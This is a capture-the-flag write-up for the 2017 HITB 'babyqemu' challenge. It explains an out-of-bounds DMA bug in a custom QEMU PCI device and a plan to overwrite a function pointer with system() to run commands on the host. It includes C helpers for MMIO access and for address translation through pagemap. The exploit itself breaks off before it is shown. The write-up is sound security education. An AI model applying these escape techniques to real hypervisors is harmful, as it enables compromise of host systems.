This is a short writeup explaining how I solved the "babyqemu" challenge of
HITB GSEC 2017. I greatly enjoyed solving the challenge since I had never
before written any kind of hypervisor escape.

## Overview

For this challenge, players were given [a tar.gz](https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz) file containing the
following files:


    -rwxr-xr-x    1 sam  staff   281B Jul 11 15:38 launch.sh
    drwxr-xr-x   59 sam  staff   2.0K Jul 11 13:36 pc-bios
    -rwxr-xr-x    1 sam  staff    38M Jul 11 13:32 qemu-system-x86_64
    -rw-r--r--    1 sam  staff   3.7M Jul 11 13:32 rootfs.cpio
    -rwxr-xr-x    1 sam  staff   7.0M Jul 11 13:35 vmlinuz-4.8.0-52-generic

The launch.sh script contains the following:

{% highlight bash %}
#!/bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda
{% endhighlight %}

Note the last line, in which a custom `hitb` device is made available for the
guest operating system. It seems our goal is to exploit the emulation code for
this device and gain code execution inside the qemu process (running the
`qemu-system-x86_64` executable). The fact that we can simply login as root on
the provided machine (and remotely) without a password supports this theory.

## Reversing the device emulator

Fortunately, the provided `qemu-system-x86_64` was not stripped (and even
contained debug symbols, giving us structure layouts) so we have all the
function names.  Loading the `qemu-system-x86_64` into IDA, we can filter for
all functions containing the word `hitb` and are left with a fairly short list
of relevant functions:

    Function name                        Segment Start            Length

The registered PCI device uses the following struct to store any state:

    00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1490)
    00000000 pdev            PCIDevice_0 ?

    00001BC0 dma_mask        dq ?
    00001BD0 HitbState       ends

    00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1488)
    00000000 src             dq ?
    00000008 dst             dq ?

    00000018 cmd             dq ?
    00000020 dma_state       ends

Reversing the code a bit, we see that:

* The code registers a custom PCI device names 'hitb' and allocates an
  [I/O memory](https://en.wikipedia.org/wiki/Memory-mapped_I/O) region for it. With
  memory mapped I/O, the guest can read and write device "registers" simply by
  reading from and writing to specific *physical* addresses.

* The registered device has handler functions (`hitb_mmio_write` and
  `hitb_mmio_read`) for read and write accesses from the guest to the allocated
  memory region. These handlers will be called everytime the guest operating
  systems accesses a physical address inside the range allocated for the PCI
  device.

* The device supports a custom DMA mechanism, allowing the guest operating
  system to read and write data into a fixed-sized buffer (`dma_buf`) inside of
  the device structure

The DMA buffer can be written to in the following way:

1. The guest writes the physical address of the source buffer to the `dma.src`
   register (by writing to offset 128 in the iomem region)
2. The guest writes the host buffer offset into the `dma.dst` register (offset 136)
3. The guest writes the number of bytes to copy into the `dma.cnt` register (offset 144)
4. The guest writes the constant 1 into the `dma.cmd` register (offset 152)

This will schedule the execution of a separate function which essentially
performs a memcpy from the given guest buffer into the host buffer.

Reading back the content of the DMA buffer works essentially the same, except
that src and dst need to be exchanged.

Looking at the code, we can see that no validation is performed on the given
offset into the DMA buffer. As such we can read to and write from arbitrary
memory adjacent to the hitb device instance (since the buffer is embedded into
the structure, and not just a pointer to it).

Conveniently, a function pointer (`enc`) is located right after the storage
buffer and will be called if the guest requests "encrypted" DMA transfers
(which simply XORs all data with 0x66). The first argument for that function
will be a pointer into the `dma_buf`, thus containing attacker controlled data.
Even more conveniently, the `system` function is linked into the qemu binary,
so we don't even need to leak the address of libc.

All we have left to do is implement I/O memory accesses from the guest.

## Memory mapped I/O from Linux usermode

Access to (almost) the whole physical memory is possible in Linux by open()ing
and mmap()ing `/dev/mem`. However, in our case there is a simpler way: the
device directory under /sys contains a pseudofile named "resource0", which
gives the user a "view" onto the physical memory used by the device.  In our
case, the full path for this device file is
`/sys/devices/pci0000:00/0000:00:04.0/resource0`.

With that, reading e.g. the register at offset 128 (the `dma.src` register) can
be performed with the following C code:

{% highlight c %}
void* iomem;

void iowrite(uint64_t offset, uint64_t value)
{
    *((uint64_t*)(iomem + offset)) = value;
}

int main()
{
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);

    iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    iowrite(128, 0x1337);

    return 0;
}
{% endhighlight %}

To use the DMA mechanism, we also need the physical address of a buffer that we
can write to and read from. Fortunately, Linux provides the `/proc/$pid/pagemap`
[pseudofile](https://www.kernel.org/doc/Documentation/vm/pagemap.txt), which
gives us excactly this information. Using this pseudofile, we can obtain the
physical address for a virtual address in our process using the following C
code:

{% highlight c %}
uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        die("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}
{% endhighlight %}

With that we have everything to reach the vulnerable code inside the custom
qemu binary.

## Putting everything together

The exploit now does the following:

1. Use the out-of-bounds DMA access to read the value of the `enc` function
   pointer
2. Add the offset to the PLT stub for `system` to that pointer and write it
   back using the DMA bug again
3. Write the string `cat flag` into the DMA page. This will be the first
   argument to the `enc` function pointer
4. Perform an "encrypted" DMA transfer to call the function pointer

Here is the exploit in action:
